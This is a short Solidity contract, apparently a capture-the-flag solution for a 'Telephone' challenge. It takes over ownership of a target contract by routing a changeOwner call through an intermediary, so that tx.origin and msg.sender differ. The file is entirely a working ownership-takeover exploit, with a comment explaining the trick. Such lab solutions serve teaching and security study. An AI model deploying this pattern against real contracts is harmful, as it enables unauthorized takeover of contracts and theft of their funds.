pragma solidity ^0.8.21;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone private challenge;

    constructor(address _challengeAddress) {
        challenge = ITelephone(_challengeAddress);
    }

    // by re-routing the call to Telephone contract via this contract, on Telephone contract:
    // tx.origin will be the EOA and msg.sender will be this contract
    function attack() external {
        challenge.changeOwner(msg.sender);
    }

    receive() external payable {}
}
